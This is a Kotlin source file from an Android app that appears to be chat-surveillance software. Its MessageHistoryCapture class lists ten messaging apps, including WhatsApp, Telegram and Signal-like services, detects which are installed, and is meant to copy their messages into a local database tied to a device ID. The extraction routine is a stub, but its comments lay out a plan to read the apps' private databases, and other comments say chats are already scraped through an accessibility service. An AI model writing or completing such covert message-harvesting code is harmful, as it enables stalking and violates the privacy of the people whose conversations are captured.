package com.chats.capture.utils

import android.content.Context
import android.content.pm.PackageManager
import com.chats.capture.CaptureApplication
import com.chats.capture.database.ChatDao
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.models.ChatData
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import timber.log.Timber

/**
 * Captures existing messages from messaging apps
 * Note: Most apps encrypt their databases, so direct extraction may be limited
 * Alternative: Use AccessibilityService to scroll through chat history (not implemented here)
 */
class MessageHistoryCapture(private val context: Context) {
    
    private val chatDao: ChatDao = (context.applicationContext as CaptureApplication).database.chatDao()
    private val deviceRegistrationManager = DeviceRegistrationManager(context)
    
    private val targetAppPackages = mapOf(
        "com.whatsapp" to "WhatsApp",
        "com.instagram.android" to "Instagram",
        "com.facebook.katana" to "Facebook",
        "com.facebook.orca" to "Messenger",
        "org.telegram.messenger" to "Telegram",
        "com.snapchat.android" to "Snapchat",
        "com.twitter.android" to "Twitter",
        "com.discord" to "Discord",
        "com.viber.voip" to "Viber",
        "com.skype.raider" to "Skype"
    )
    
    /**
     * Capture all existing messages from messaging apps
     * This is a placeholder - most apps encrypt their databases
     * Messages should already be captured via EnhancedAccessibilityService during normal use
     */
    suspend fun captureAllMessages(): List<ChatData> = withContext(Dispatchers.IO) {
        try {
            val deviceId = deviceRegistrationManager.getDeviceId()
            val allMessages = mutableListOf<ChatData>()
            
            // Check which target apps are installed
            val installedApps = getInstalledMessagingApps()
            
            Timber.d("Found ${installedApps.size} installed messaging apps")
            
            // Attempt to extract messages from each app
            // Note: Most apps encrypt their databases, so this will likely return empty
            installedApps.forEach { (packageName, appName) ->
                try {
                    val messages = attemptMessageExtraction(packageName, appName, deviceId)
                    if (messages.isNotEmpty()) {
                        allMessages.addAll(messages)
                        Timber.d("Extracted ${messages.size} messages from $appName")
                    } else {
                        Timber.v("No messages extracted from $appName (database may be encrypted or inaccessible)")
                    }
                } catch (e: Exception) {
                    Timber.e(e, "Error extracting messages from $appName")
                }
            }
            
            // Save to database
            allMessages.forEach { chat ->
                try {
                    // Check for duplicates
                    val existing = chatDao.findDuplicateChat(
                        chat.appPackage,
                        chat.text,
                        chat.timestamp
                    )
                    
                    if (existing == null) {
                        chatDao.insertChat(chat)
                    }
                } catch (e: Exception) {
                    Timber.e(e, "Error saving message")
                }
            }
            
            Timber.d("Captured ${allMessages.size} existing messages from all apps")
            allMessages
        } catch (e: Exception) {
            Timber.e(e, "Error capturing message history")
            emptyList()
        }
    }
    
    /**
     * Get list of installed messaging apps
     */
    private fun getInstalledMessagingApps(): Map<String, String> {
        val installed = mutableMapOf<String, String>()
        val pm = context.packageManager
        
        targetAppPackages.forEach { (packageName, appName) ->
            try {
                pm.getPackageInfo(packageName, 0)
                installed[packageName] = appName
            } catch (e: PackageManager.NameNotFoundException) {
                // App not installed, skip
            } catch (e: Exception) {
                Timber.w(e, "Error checking if $packageName is installed")
            }
        }
        
        return installed
    }
    
    /**
     * Attempt to extract messages from app database
     * Most apps encrypt their databases, so this will likely return empty
     * This is a placeholder for future implementation
     */
    private suspend fun attemptMessageExtraction(
        packageName: String,
        appName: String,
        deviceId: String?
    ): List<ChatData> {
        // Placeholder implementation
        // In a real implementation, this would:
        // 1. Try to access app's database (usually in /data/data/packageName/databases/)
        // 2. Attempt to query messages table
        // 3. Handle encryption if database is encrypted
        
        // For now, return empty list since databases are typically encrypted
        // Messages will be captured via AccessibilityService during normal app usage
        
        Timber.v("Message extraction from $appName not implemented (database likely encrypted)")
        return emptyList()
    }
}
